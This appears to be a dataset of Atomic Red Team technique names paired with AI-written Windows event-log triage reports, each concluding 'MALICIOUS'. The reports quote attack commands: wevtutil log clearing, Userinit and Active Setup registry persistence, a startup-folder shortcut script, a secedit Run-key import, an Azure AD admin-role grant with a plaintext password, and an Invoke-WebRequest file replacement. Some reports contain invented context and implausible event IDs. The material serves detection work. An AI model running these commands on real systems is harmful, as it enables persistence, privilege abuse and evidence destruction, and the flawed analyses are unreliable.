  - The clearing of multiple logs by `admin_test` is highly suspicious and aims to destroy potential evidence of earlier activities.
  - The presence and execution of a potentially malicious tool from the AtomicRedTeam suite suggest illicit activities (e.g., privilege escalation, code injection) typically associated with penetration testing or rogue behavior.
  - The sequence and consistency of execution of logs clearing and usage of internal tools align with typical attack methodologies aiming to obfuscate actions.

### Resolution: **MALICIOUS**

The collected evidence strongly supports the conclusion that these activities are malicious. The user `admin_test` executed suspicious processes likely aimed at exploiting the system or simulating an attack and subsequently attempted to cover tracks by clearing logs.

### Recommendations

1. **Immediate Actions:**
   - Isolate the affected host `Server002` from the network to prevent further propagation or attacks.
   - Notify relevant stakeholders, including IT and incident response teams, to prepare for potential broader investigation and remediation.

2. **Investigation and Remediation:**
   - Initiate a full forensic investigation to identify any additional compromised systems or data exfiltration.
   - Review access logs to identify potential unauthorized accesses or suspect lateral movements.
   - Re-evaluate the permissions and activities of `admin_test` and investigate for potential credential compromises.

3. **Preventive Measures:**
   - Strengthen monitoring of critical accounts and processes for anomalies and indicators of compromise.
   - Implement stricter controls and monitoring around clearing event logs.
   - Educate IT personnel on recognizing and properly handling attack simulations versus potential real threats.

Conclusively, the activities are detrimental to the organizational security posture, necessitating an immediate and thorough response to mitigate risks and understand the impact."
Domain Password Policy Check: No Uppercase Character in Password,"### Detailed Analysis:

**1. Windows PowerShell Log:**
   - The logs show a PowerShell script execution involving credential management. This script attempts to change an Active Directory account password for the current user. The script checks an existing credential file, compares passwords, and securely changes the password if the condition is met. The use of `AtomicRedTeam` indicates this might be a simulation of an attack technique possibly used for testing or training purposes. 
   - The string `lower-long-special-333` is consistently used, pointing to a hardcoded password, which can be a risk if exploited.
   - No clear signs of malicious intent in this specific execution, but it warrants further inspection due to potential misuse.

**2. Security Log:**
   - Several `4798` events are logged, indicating enumeration of account details by `CompatTelRunner.exe`, an executable associated with Microsoft's telemetry service. This is not inherently malicious, but its timing and frequent enumeration of multiple accounts, including `Administrator`, `Guest`, among others, raises suspicion.
   - Event `1102` shows that Event Logs were cleared by a user `admin_test` at a pertinent time. This action can be part of an anti-forensic technique used by attackers to cover tracks and indicates potential malicious activity.
   - Privilege escalation is evident with a `4672` event granting high-level user rights, including `SeDebugPrivilege` and `SeTcbPrivilege` to `SYSTEM`. While common in normal operations, given other suspicious context, it may indicate a prelude to malicious activity.

**3. Sysmon Log:**
   - The Sysmon logs show multiple clear events of `wevtutil.exe` being used to clear logs across various channels (e.g., `Security`, `System`), consistent with the suspicious clearing seen in the Security log. 
   - There are instances where `whoami.exe` and `hostname.exe` processes were executed, typical reconnaissance commands used during the enumeration phase of an attack.
   - `CompatTelRunner.exe` is executed in a succession that correlates with the security log's account enumeration timestamps, which can be suspicious due to its repetitive and close time frames.

**4. System Log:**
   - Events `104` indicate that `System` and `Windows PowerShell` logs have been cleared right before the critical timestamp in Security logs. This confirms the anti-forensic patterns initiated by `admin_test`.

### Assessment:

The combination of logs suggest suspicious activities potentially indicating a compromise:
- The clearing of event logs (`1102`, `104`) is a significant red flag, potentially indicating a malicious user in an attempt to remove traces of their activities.
- `CompatTelRunner.exe` performing enumeration on several accounts is unusual for its typical operation, especially with repeated rapid-fire executions.
- The use of PowerShell for credential manipulation further adds to the suspicion, given the hardcoded password and functionality to modify Active Directory credentials.

### Conclusion:

**Resolution: MALICIOUS**

### Guidance:

- Conduct immediate containment measures on the affected systems, especially `Server002`.
- Investigate the user account `admin_test` thoroughly for any unauthorized access or compromise.
- Review any saved credentials or scripts related to `AtomicRedTeam` on potentially affected machines for signs of modifications or abnormal usage.
- Consider disabling and changing passwords for accounts potentially affected, especially those seen enumerated.
- Enhance log monitoring and consider implementing more stringent access controls to mitigate unauthorized activities.
- Engage threat hunting teams to look for further signs of compromise across the network."
secedit used to create a Run key in the HKLM Hive,"Upon reviewing the Windows event logs provided, several points of interest indicate potentially malicious activities. Here is the detailed analysis:

### Analysis:
1. **Event Log Clearing:**
   - Wevtutil commands are repeated, appearing multiple times in a short time span, indicating possible clearing of event logs:
     - `CommandLine: ""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`
     - Similar commands are observed for clearing Application and System logs.
   - Security event logs (Event ID 1102) and system logs (Event ID 104) being cleared can be a strong indicator of someone attempting to hide their tracks. User `admin_test` seems responsible for log clearing, which is highly suspicious.

2. **Command Execution and Registry Modification:**
   - The execution of `cmd.exe` with `secedit` to import and configure a security template is unusual and could indicate a privilege escalation attempt:
     - `CommandLine: ""cmd.exe"" /c secedit /import /db mytemplate.db /cfg ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1547.001\src\regtemplate.ini"" & secedit /configure /db mytemplate.db`
   - References to ""AtomicRedTeam"" suggest potential execution of adversary simulation tools, confirming suspicious activities.

3. **Service and Host Processes:**
   - Multiple activities related to Microsoft Edge Update processes under the context of NT AUTHORITY\SYSTEM. Though it might appear routine, when investigated alongside other anomalies, it may form part of a crafted payload or lateral movement within the system.
   
4. **Use of `whoami` and `hostname`:**
   - The execution of `whoami.exe` and `hostname.exe` could be legitimate but can also be used by an attacker to understand the machine and user context in which they have gained access, a common initial post-compromise action.

### Conclusion:
The combination of cleared event logs, suspicious command-line executions with potential privilege escalation intent, and the execution context under a high-integrity level indicates that these logs record activities consistent with a malicious actor attempting to perform unauthorized changes and cover their tracks.

### Resolution:
**MALICIOUS** - The activities observed in the logs have indicators of an active compromise that involve attempts to obfuscate, escalate privileges, and possibly tamper with security configurations. Immediate steps should be taken for a deeper forensic investigation, containment, and remediation of the affected systems. This includes:
- Conducting a full disk and memory forensics analysis on the affected machine.
- Reviewing and resetting credentials for `admin_test` and any associated accounts as necessary.
- Monitoring other systems for similar activities.
- Reinforcing security policies and increasing logging rigor temporarily to detect any repeat activity.

Prompt action is essential to mitigate any further risk to the organization."
HKLM - Add malicious StubPath value to existing Active Setup Entry,"### Detailed Analysis of Provided Windows Event Logs

Upon analyzing the provided event logs from the Sysmon, Security, Windows PowerShell, Application, and System channels, several indicators and patterns emerge that warrant discussion. Below, I detail observations from these logs.

#### Observations

1. **Process Execution and Command-Line Activity**:
   - **Sysmon Logs** show multiple instances of the process `MicrosoftEdgeUpdate.exe` executing from various directories and with different command-line arguments (`/regserver`, `/update`, `/svc`, `/c`). While Microsoft Edge Update is legitimate software, unusual executions or from non-standard paths could be exploited by attackers.
   - A suspicious Windows PowerShell command is visible in both **Sysmon** and **PowerShell Logs**: `Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" ""StubPath"" ""C:\Windows\System32\calc.exe"" -Force`. This command changes registry settings to execute the calculator (calc.exe) during user logon, indicating a potential persistence mechanism.
   - **Security Logs** also indicate that the security log and system log were cleared (`EventID 1102` for security log), which is a common action to hide malicious activities, typically associated with compromise.
   
2. **Log Clearance Activity**:
   - Multiple logs, specifically the Security and System logs, were cleared by the user `admin_test`. This user action is highly suspect because log clearance can hide traces of an attack.

3. **Time Change Activity**:
   - The **Security Logs** contain two `EventID 4616` instances indicating a change in the Windows system time by `LOCAL SERVICE`. Time manipulation can often indicate attempts to bypass security mechanisms or coordinate malicious activities to evade logging.

4. **Network and Service Behavior**:
   - The logs provide various execution activities from `MicrosoftEdgeUpdate.exe` and PowerShell scripts. Legitimately, these would be used for standard application updating services, but their use in registry alterations and unscheduled scheduling tasks suggests suspicious activity.
   
5. **Integrity Level and User Context**:
   - Processes run under different integrity levels and user contexts, notably `NT AUTHORITY\SYSTEM`, which grants high privileges. Most legitimate updates wouldn't require such privilege elevations to perform basic operations.

6. **Calculation of Specific Application Execution**:
   - There is evidence of `calc.exe` being set to run using a startup registry key. `Calc.exe` is commonly used as a testing or evasion method in malicious contexts to confirm execution of payloads without causing a host-wide disruption, confirming the likely presence of a simulated or real attack methodology.

#### Assessment

The combination of registry changes via PowerShell, log clearance, and registry-based persistence alongside unscheduled execution patterns poses a serious security concern. Legitimate system applications—particularly executed under system-level permissions without clear contextual scheduling—align with frequent tactics employed in adversarial attacks.

**Resolution: MALICIOUS**

#### Recommendations for Action

1. **Immediate Incident Response**:
   - Disconnect from Network: Temporarily disconnect Server002 from sensitive networks to prevent lateral movement.
   - Forensic Analysis: Conduct deeper forensic disk and memory analysis of Server002 to identify any additional malware artifacts or rootkits that may have been installed.
   - Examine EDR Alerts: Review what triggered the initial alert for more context on the compromise.

2. **Audit and Clean Up**:
   - Revisit Security Policies: Ensure strict logging policies and regular review of critical systems and alerts.
   - Check for Persistence: Investigate other registry keys sensitive to persistence mechanisms and offset them back to default or secured states.
   - Validate Time Settings: Verify correct time settings remain and ensure consistent time-source updates.

3. **Enhance Monitoring**:
   - Heightened Monitoring: Place specific monitoring on registry changes and system log clearance actions going forward.
   - Implement Behavioral Detection: Use behavior-based antivirus and SIEM correlation rules to flag suspicious PowerShell activities and registry manipulations instantly.

Overall, given the observed activities, immediate containment, investigation, and remediation steps are necessary to address this incident and mitigate any potential threat against the organizational environment."
Process Injection with Go using CreateThread WinAPI (Natively),"### Detailed Analysis of the Logs

**Indicators of Potential Malicious Activity:**

1. **Event Log Clearing**: The security event log entry with `EventID 1102` indicates that the security log was cleared by the user `admin_test` on `Server002`. This is a critical sign, as attackers often clear logs to cover their tracks after compromising a system.

2. **Time Manipulation**: The security log shows two events with `EventID 4616`, indicating that the system time was changed. Altering system time can be used maliciously to bypass security mechanisms or to mess with timestamp logs, potentially indicating an effort to hide actions taken on the machine.

3. **Usage of `wevtutil.exe`**: Multiple instances of `wevtutil.exe` were executed, and these entries are paired with the clearing of logs (e.g., Sysmon Event IDs 1 and 5 indicate process creation and termination of `wevtutil.exe`). The command lines used (`cl Security`, `cl Application`, `cl System`, and `cl ""Windows PowerShell""`) suggest an intent to clear logs across different areas, a known technique to hinder forensic investigations.

4. **PowerShell Usage**: Events from both Sysmon and Windows PowerShell logs indicate a PowerShell session launched to execute a tool from `AtomicRedTeam`, specifically `CreateThreadNative.exe`. The `Atomic Red Team` is a well-known collection of tests for adversary tactics, techniques, and procedures (TTPs). The execution of such a tool is often associated with penetration testing or malicious activity, indicating the possible use of testing tools in a live environment.

5. **Anomalous Process Execution**: Various legitimate Windows processes such as `conhost.exe`, `hostname.exe`, and `whoami.exe` were seen executing shortly after suspicious activities, but may serve as indicators of escalation events or reconnaissance depending on context.

**Assessment and Risks Identified**:

- The clearing of logs and manipulation of timestamps strongly suggests malicious intent, likely to obscure actions taken on the system.
  
- The usage of `wevtutil.exe` in a manner consistent with log clearing across several critical logs consolidates the suspicion of covering tracks.

- The execution of `PowerShell` to run a binary from the `AtomicRedTeam` toolkit could imply red teaming actions or an unauthorized test of security postures, which could still pose risks if done unsanctioned.

**Guidance on How to Proceed:**

- **Immediate Action Required**: The actions identified point to potentially unauthorized access and activity that needs to be thoroughly investigated. Consider isolating the system `Server002` from the network to prevent further actions by the suspected malicious actor.

- **Forensic Analysis**: Conduct a complete forensic analysis on the host. Key areas include any remaining event logs, PowerShell script execution artifacts, filesystem changes, and any traces of data exfiltration activities.

- **Review Access and User Activity**: Review the user activity for `admin_test`, who performed critical operations. Verify the legitimacy of this account activity and assess any unauthorized access or privilege escalations.

- **Internal Communication**: Notify relevant teams and possibly higher management about this incident, especially due to the involvement of tools like AtomicRedTeam, which can indicate simulated attacks or unauthorized tests.

- **Security Measures**: Consider enhancing security monitoring, reviewing endpoint detection rules, and ensuring that logging is tamper-evident. Implement practices to monitor for and alert on time manipulation and unauthorized log tampering.

**Resolution**: **MALICIOUS** - The analyzed logs contain activities that strongly suggest malicious attempts to alter, obfuscate, or fully clear logs to hide unauthorized access or activities on the system."
Add Executable Shortcut Link to User Startup Folder,"### Analysis of Logs:

#### Suspicious and Anomalous Behaviors:
1. **Log File Clearing:**
   - The event log entries from the Security log show that the event logs have been cleared (`EventID 1102`). This can be a strong indicator of malicious activity as attackers often clear logs to cover their tracks.
   - Additionally, we notice multiple uses of `wevtutil.exe` with the command-line argument `""cl""`, which stands for `clear`.

2. **PowerShell Activity:**
   - There is a PowerShell script being executed that creates a shortcut to `calc.exe` in the user's startup folder. This behavior is indicative of persistence techniques employed by attackers. The command is:
     ```plaintext
     $Target = ""C:\Windows\System32\calc.exe""
     $ShortcutLocation = ""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk""
     $WScriptShell = New-Object -ComObject WScript.Shell
     $Create = $WScriptShell.CreateShortcut($ShortcutLocation)
     $Create.TargetPath = $Target
     $Create.Save()
     ```

3. **Unusual Use of `whoami.exe`:**
   - The `whoami.exe` process is executed, generally used to identify the currently logged in user. While this could be benign, its usage is commonly observed in situations where the attacker wants to confirm their level of access.

4. **Creating Shortcuts in Startup Folder:**
   - The PowerShell execution results in an attempt to establish persistence by creating a startup shortcut, which is often unusual for regular applications but common in malware activities.

5. **Repeated Usage of `wevtutil.exe`:**
   - `wevtutil.exe` is used multiple times to clear various event logs, including Security, Application, and System. This is a typical method used by attackers to hinder forensic investigations by removing evidence of malicious activities.

#### Malicious Activity Indication:
From the patterns observed:
- The clearing of logs and attempts at persistence using the startup folder indicate clear signs of malicious activity.
- Coupled with the PowerShell script attempting to create a startup entry for an executable (`calc.exe`), this activity is suspicious and signature of potential malware tactics.

#### Assessment and Resolution:
- **Situation Assessment:**
  - The activity on the system demonstrates potential compromise via malware that is attempting to persist on the system and clear its tracks by removing event logs. The usage of PowerShell for suspicious script execution adds to this concern.
  
- **Identified Threats/Risks:**
  - Potential backdoor or persistency mechanism in place due to unauthorized script execution.
  - Log clearing suggesting attempted cover-up of activities.

#### Guidance:
- Conduct immediate containment by isolating the affected machine to prevent further lateral movement.
- Review and potentially remove the created startup shortcut.
- Perform a thorough malware scan and forensic investigation on the machine to remove any malicious persistencies.
- Consider bolstering audit policies to detect similar activities in the future and ensure that PowerShell logging and event logs cannot be easily tampered with.

### Resolution: **MALICIOUS**"
Winlogon HKLM Userinit Key Persistence - PowerShell,"Upon reviewing the provided Windows event logs, I have identified several critical events that suggest potential malicious activity. Below is the detailed analysis of suspicious and anomalous behaviors found in the logs:

1. **Event Log Clearing:**
   - System and Security event logs have been cleared multiple times by the user ""admin_test"", as seen in the System log (`EventID 104`) and Security log (`EventID 1102`). Clearing of logs is a known behavior to obfuscate malicious activities on a system.

2. **PowerShell Script Execution:**
   - A suspicious PowerShell command is executed: `Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, C:\Windows\System32\cmd.exe"" -Force`. This modifies a registry key related to the Windows Userinit process with a potentially dangerous value, which can be used for persistence or running unauthorized commands at system startup.

3. **Process Creation and Use of Wevtutil:**
   - The `wevtutil.exe` utility is used multiple times (`EventID 1` in Sysmon logs) to clear various event logs like Sysmon, Security, Application, and System logs. This is indicative of attempts to cover tracks after conducting suspicious activities.

4. **Suspicious Parent-Child Process Relationship:**
   - Several processes (`wevtutil.exe`, `powershell.exe`, and `svchost.exe`) have relationships that do not align with typical system operations. The parent-child relationship involving `wsmprovhost.exe` and tasks indicative of administrative activities (though potentially legitimate) raise concerns, especially when seen alongside other suspicious activities.

5. **Elevated Privileges:**
   - Privilege escalation activities are noted with `admin_test` having elevated privileges typically associated with administrative tasks (`EventID 4672` in Security log), such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, which are higher-risk privileges in the context of anomalous behavior already noted.

Given these activities, there is significant evidence pointing toward potentially malicious intent. These patterns indicate an effort to manipulate the system (through registry modification and log clearing) and maintain persistence, possibly by a threat actor with administrative access on the system.

**Assessment and Resolution:**
- **Resolution: MALICIOUS**: Based on the evidence of log clearing, suspicious PowerShell execution, registry manipulation for startup persistence, and elevated privilege usage, these logs depict malicious actions on the system.

**Guidance on How to Proceed:**
1. **Immediate Isolation**: Immediately isolate the affected host from the network to prevent further potential damage or lateral movement.

2. **Conduct Full Malware Scan**: Perform a comprehensive malware and rootkit scan on the system to detect and remove any malicious software.

3. **Forensic Investigation**: Carry out a detailed forensic analysis of the system to identify the scope of the compromise, including additional logs or data not covered in this analysis.

4. **Review and Reset Credentials**: Review accounts and perform password resets, especially for any administrative accounts like `admin_test`.

5. **Security Enhancements**: Implement additional security controls such as endpoint detection and response (EDR) solutions, enhanced logging, and user activity monitoring to detect and respond to future suspicious activities more effectively.

6. **Communication and Reporting**: Notify relevant stakeholders and, if necessary, report the incident to appropriate authorities or within the compliance framework of your organization."
Process Injection via Extra Window Memory (EWM) x64 executable,"Upon reviewing the logs provided, several key observations can be made that suggest suspicious and potentially malicious activities:

### Suspicious and Potentially Malicious Activities:
1. **Clearing of Logs**: 
   - **System Log** and **Security Log** entries show events with `EventID: 104` and `EventID: 1102`, indicating that logs have been cleared by a user with the username `admin_test`. Log file clearing is often an attempt to cover tracks after a potentially malicious activity.

2. **Usage of `wevtutil.exe`**:
   - There are several Sysmon logs (ID: 1) showing executables like `wevtutil.exe` being invoked with the command line options to clear specific logs (e.g., `""C:\\Windows\\system32\\wevtutil.exe\"" cl System`). This further corroborates the logs being cleared intentionally.

3. **Execution of `T1055.011_x64.exe`**:
   - The logs highlight the execution of `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1055.011\bin\T1055.011_x64.exe` via PowerShell. This executable is known to be part of the [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) testing suite, which is used to simulate adversary techniques. However, its presence on a production CEO's machine without express testing intention should be alarming.

4. **High Integrity Level Processes**:
   - Notably, a range of processes executed in the context of `admin_test` with `High` integrity levels are captured. These include usage of tools like `whoami.exe` which are typically leveraged by attackers for reconnaissance purposes.

5. **Usage of `sppsvc.exe`**:
   - Frequent activation of the `sppsvc.exe` is noticed. While this can be legitimate, in context with clearing of logs and execution from Temp paths, raises a flag on potential misuse for privilege escalation or persistence.

### Conclusion:
The combination of logs being cleared, execution of potential red teaming tools without clear purpose, alongside elevated PowerShell executions suggests activities that are not compliant with standard operational procedures and align with tactics seen in malicious behaviors.
 
- **Resolution**: **MALICIOUS**

### Further Recommendations:
- **Containment**: Immediate steps should be taken to isolate the CEO's machine from the network to prevent further potential harm.
- **Investigation**: Conduct a full forensic investigation on the machine to identify any additional compromised components or accounts.
- **Communication**: Notify relevant internal security teams about the potential breach and begin communication with management about the risks and actions being taken."
Print Processors,"**Detailed Analysis of the Logs:**

### 1. Overview:
Upon investigation, the provided logs appear to indicate a potentially malicious activity involving the use of Windows PowerShell and manipulation of the Windows printing subsystem. There are also indications of Windows event log clearance, which is often a technique used by attackers to cover their tracks.

### 2. Key Indicators of Compromise:

- **Suspicious PowerShell Activity:**
  - A PowerShell script execution is logged that modifies the Print Spooler service configuration and adds a DLL to the print processor's environment. The command involves using PowerShell to conditionally start and stop the spooler service, copy a DLL (AtomicTest.dll) to a sensitive directory, and modify the registry to include the DLL under Print Processors, suggesting a persistence mechanism or privilege escalation attempt.

- **Event Log Clearance:**
  - Security Event ID 1102 indicates that the logs were cleared by the user `admin_test`. Clearing event logs is a red flag indicating an attempt to hide actions on the host.

- **High Integrity Processes:**
  - The execution of `wevtutil.exe` to clear logs is observed with a high integrity level. This operation was performed by the user `admin_test`, indicating potential unauthorized privilege usage.

- **Suspicious File and Command Execution:**
  - Execution of `wevtutil.exe` with command-lines to clean various event logs, potentially used to cover up traces.
  - Execution of `conhost.exe` paired with `wevtutil.exe` hints at attempting background operations or remote execution.

### 3. Edge Update Activity:
While there is extensive legitimate activity related to the Microsoft EdgeUpdate process (`MicrosoftEdgeUpdate.exe`), these are typical of automatic updates and not indicating for malicious action.

### 4. Other Observations:
- Time manipulation is noted by `svchost.exe`, but this seems aligned with automatic system time correction and synchronization activities and is not inherently malicious.
- Multiple processes performed under `NT AUTHORITY\SYSTEM` indicate that some activities have been automated or scheduled tasks.

### Assessment:
Given the PowerShell commands modifying system services and registries, paired with the event log clearance, these logs show clear signs of malicious activity. 

### Threats and Risks:
- **Persistence Mechanism:** Registry modifications and use of DLL injection into the print spooler may facilitate long-standing unauthorized access or privilege escalation.
- **Privilege Escalation:** The use of high integrity levels and clearing event logs are serious concerns.
- **Potential Data Breach:** Clearing logs and installing persistent code can be preparatory steps for facilitating a larger breach or lateral movement within the network.

### Guidance:
- **Immediate Actions:**
  - Disconnect the machine from the network to prevent further actions by potential attackers.
  - Conduct a full antivirus and malware scan.
  - Investigate related access logs and network traffic for other signs of intrusion.
  - Restore system state if known clean backups are available.
  
- **Review and Hardening:**
  - Audit user privileges and group memberships, particularly for the `admin_test` account.
  - Implement stricter PowerShell execution policies.
  - Monitor logs for similar patterns across other machines in the network.

### Resolution:
**MALICIOUS** - The logs contain clear signs of malicious activity."
Process Injection via mavinject.exe,"The investigation into the provided logs highlights several activities that raise concerns of potential malicious behavior:

1. **Process Execution and Command Line Usage**:
   - **Event ID 1 (Sysmon)** shows multiple instances of `wevtutil.exe` being executed with the `cl` (clear log) option:
     - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `wevtutil.exe cl Application`
     - `wevtutil.exe cl System`
     - `wevtutil.exe cl ""Windows PowerShell""`
   - Executing `wevtutil` with these parameters indicates an attempt to clear various Windows event logs, which is a tactic often used to cover tracks after illicit activities.

2. **PowerShell Activity**:
   - Events show `PowerShell.exe` executing with a command intended to start Notepad, inject a DLL using `mavinject`, and then stop Notepad.
   - This activity is notably suspicious as it indicates the use of code injection (`mavinject`) into another process (Notepad), which is a technique used by attackers for running their code in the context of a seemingly benign process.

3. **Logs Clearance**:
   - The System, Security, and PowerShell logs contain entries indicating they have been cleared:
     - System log cleared by `admin_test`
     - Windows PowerShell log cleared by `admin_test`
     - EventID 1102 in the Security log also indicates log clearance.
   - Log clearance without legitimate administrative purpose suggests an attempt to obfuscate system activities.

4. **Indicators of Potential Testing or Malicious Simulations**:
   - The presence of test-like elements in the PowerShell script (e.g., paths and commands injected from what appear to be directories related to testing frameworks like Atomic Red Team) suggests either a security test or exploitation. Nonetheless, without explicit documentation of a test being conducted, this activity is highly suspect.

5. **Context and User Account Usage**:
   - Most actions are executed under the `SERVER002\admin_test` account, suggesting either this account is compromised or misused for unauthorized actions. The repeated use of administrative tools further implies elevated privileges were available.

Upon evaluating these points, the logs provide sufficient evidence to classify this behavior as **MALICIOUS**. The activities, including the clearing of logs, execution of potentially malicious scripts, and code injections, are clear indicators of a compromise attempt or successful breach.

**Recommendations**:
1. Conduct a thorough investigation into the `admin_test` account for unauthorized activity and potentially reset its credentials.
2. Determine if the suspicious processes (PowerShell, wevtutil) were authorized or part of a scheduled security assessment.
3. Examine the other machines in the network for similar patterns to rule out a broader compromise.
4. Review endpoint security measures and policies, ensuring they prevent illegitimate log manipulation and process injection.
5. Consider involving incident response teams to conduct a forensic analysis and root cause assessment."
Azure AD - Add Company Administrator Role to a user,"## Detailed Log Analysis

### Suspicious and Anomalous Behavior
Upon reviewing the provided logs, several notable events suggest potential malicious activity:

1. **Clearing of Event Logs:**
   - Multiple events in the **Security**, **System**, and **Windows PowerShell** logs indicate the clearing of event logs (`EventID: 1102` for Security, `EventID: 104` for System and Windows PowerShell).
   - Commands associated with `wevtutil.exe` are used to clear logs, originating from processes started by a user `SERVER002\admin_test`. The clearing of logs is a significant red flag as it often indicates an attempt to cover up malicious activity.

2. **Suspicious PowerShell Activity:**
   - Several PowerShell events show the execution of scripts that are suspicious:
     - **Add-MsolRoleMember Command:** A PowerShell command was executed to add a user to the `Company Administrator` role. This action typically requires privileged access and could represent a privilege escalation attempt.
     - **Script Execution with Cleartext Credentials:** The PowerShell script uses `ConvertTo-SecureString` to convert a string password ""p4sswd"" using the `-AsPlainText` flag. This is a potential security risk and indicative of poorly handled credential management.

3. **Recurring Use of `wevtutil`:**
   - The logs show repeated use of the `wevtutil.exe` utility by the same user to clear various event logs. This behavior, especially without clear justification or corresponding legitimate administrative tasks, is suspicious.

4. **Sysmon Logs:**
   - Execution of the PowerShell command related to `Add-MsolRoleMember` initiated and handled by a process with high integrity level suggests elevated privileges, increasing risk.

### Assessment of the Situation
The presence of activity where event logs are systematically cleared alongside suspicious PowerShell activity is a significant indicator of potential compromise. Specifically:
- The clearing of event logs is an indicator of concealment tactics often employed by attackers.
- Execution of PowerShell commands that manipulate user roles in an administrative capacity without legitimate context implies an unauthorized access attempt and potential privilege escalation.
  
### Threats and Risks Identified
- **Data Breach Risk:** An unauthorized user could gain administrative permissions, leading to data exfiltration or more profound access into sensitive areas of the network.
- **Persistence Mechanisms:** The use of PowerShell could establish persistence or alter user roles for future unauthorized access.
- **Lateral Movement:** The compromised machine can become a pivot point for further attacks within the network.

### Guidance on How to Proceed
1. **Immediate Actions:**
   - **Isolate the Machine:** Disconnect the suspected compromised host from the network to prevent further unauthorized access.
   - **Escalate Monitoring:** Enable detailed logging at network and host levels to scrutinize activities occurring before and after the suspicious events.
   - **Perform Root Cause Analysis:** Conduct thorough forensic analysis on the system to determine the origin of the breach and identify any potential indicators of compromise (IoCs).

2. **Remediation:**
   - **Password Changes:** Immediately change passwords for affected user accounts and any potentially compromised administrative accounts.
   - **Audit User Roles:** Examine and validate current permissions across critical accounts and roles within the organization.
   - **Security Patches:** Ensure systems are updated with the latest security patches to mitigate vulnerabilities.

3. **Long-Term Measures:**
   - **Security Awareness Training:** Educate users, especially on password management and secure handling of credentials.
   - **Policy Revision:** Review and, if needed, update security policies regarding privileged access management and monitoring/logging practices.

### Final Resolution
Based on the analysis of activities such as log tampering and unauthorized PowerShell execution, the final assessment is classified as:
- **MALICIOUS** - The activity and evidence indicate that the logs reflect attempts to conduct or conceal malicious activity."
Persistence by modifying Windows Terminal profile,"### Detailed Analysis

Upon reviewing the provided Sysmon, PowerShell, Application, System, and Security event logs, several indicators suggest possible malicious activity on the machine identified as Server002. Below are the key findings:

#### 1. **Unusual Process Execution and Command-line Arguments**
   - **Event ID 18031 (Sysmon Log)** and repeated executions of `wevtutil.exe` in various contexts (clearing logs, exporting event logs, etc.):
     - PowerShell was executed using a command that involved downloading a potentially malicious file from a remote location using `Invoke-WebRequest`. Specifically: 
       ```
       mv ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json ~\AppData\Local\Temp\settings.json
       Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true"" -OutFile ""~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json""
       ```
     - This command suggests an attempt to replace or modify the settings file, possibly for persistence or manipulation of configurations.

#### 2. **Event Log Clearing**
   - Multiple instances where `wevtutil.exe` is used to clear event logs:
     - **System Log Event ID 3573** and **Security Log Event ID 30358** show logs being cleared by the same user account `admin_test`.
     - Clearing of event logs is a known tactic used by threat actors to cover up their tracks and make forensic analysis difficult.

#### 3. **Privilege Escalation or Abnormal Integrity Levels**
   - The executed processes (`wevtutil.exe`, `powershell.exe`) were all running at a high integrity level, showing that they executed with elevated privileges. High integrity coupled with these actions indicates potential abuse of administrative rights.

#### 4. **Suspicious Use of Command Line Utilities**
   - The frequent use of `wevtutil.exe` with the ‘cl’ argument suggests unauthorized clearing of logs:
     - Executed commands included clearing specific logs such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`, which are typical in attempts to hide traces of actions.

### Assessment

There is strong evidence to suggest that the activity observed is indicative of malicious intent:

- **Log manipulation** using `wevtutil.exe` indicates attempts to hide other actions.
- **Malicious PowerShell command** that fetches and potentially executes remote data is highly suspicious.
- The persistence and high integrity of these actions suggest the involvement of a threat actor using the `admin_test` account.

### Resolution

Based on the analysis of the logs and the identified suspicious activities, the resolution for this situation is **MALICIOUS**.

### Guidance on How to Proceed

1. **Immediate Actions**:
   - Revoke access and change the credentials of the `admin_test` account immediately.
   - Isolate the machine (Server002) from the network to prevent further exfiltration or spread of any potential malware.

2. **Investigation and Recovery**:
   - Conduct a thorough forensic investigation to identify additional threats, potential lateral movements, and the root cause.
   - Review and restore the event logs if possible to gather more detailed information on the activity.
   - Investigate any potentially modified configuration files noted during the PowerShell command execution.
   - Scan the machine using updated antivirus or EDR tools to remove any malicious software.

3. **Preventive Measures**:
   - Implement stricter monitoring and alerting for high-integrity executions of sensitive commands and privilege escalations.
   - Educate users on the risks of unauthorized PowerShell usage and encourage secure operațional practices.
   - Regularly review and update security policies to better manage privilege escalation and monitor unusual activities."
Add Port Monitor persistence in Registry,"Based on the provided logs, there are several indicators of potentially malicious activity that warrant careful investigation:

1. **Event Log Clearing:** 
   - The security log (EventID: 1102) and system log (EventID: 104) show that logs were cleared. This action is frequently associated with attempts to obfuscate or cover tracks after performing unauthorized or malicious activity. The user ""admin_test"" is associated with these actions, potentially indicating an insider threat or a compromised account.

2. **Use of `wevtutil.exe`:** 
   - Multiple instances of `wevtutil.exe` being executed to clear various event logs (Sysmon, Application, Security, System, and Windows PowerShell) are noted. The use of `wevtutil.exe` to clear logs is a strong indicator of malicious intent, particularly when performed in rapid succession as documented.

3. **Registry Modification via `cmd.exe`:**
   - An instance of `cmd.exe` is run with a command-line argument to modify the Windows Registry (EventID: 1, ProcessId: 3648). The command appears to involve changing a registry entry related to print monitors, which could facilitate persistence or privilege escalation typical of some forms of malware (e.g., the Port Monitor DLL injection technique used by some threats).

4. **Execution Context and Privileges:**
   - The processes related to the suspicious activity were executed under the user context ""SERVER002\\admin_test,"" with a high integrity level. This potentially elevated privilege context indicates an active session with administrative rights that might have been used to perform unauthorized actions.

Given the observations and identified actions, the overall assessment of the log entries leads to the conclusion:

- **Resolution: MALICIOUS**

### Recommendations:
- **Immediate Steps:**
  1. Isolate the affected machine (Server002) from the network to prevent further propagation of potential threats.
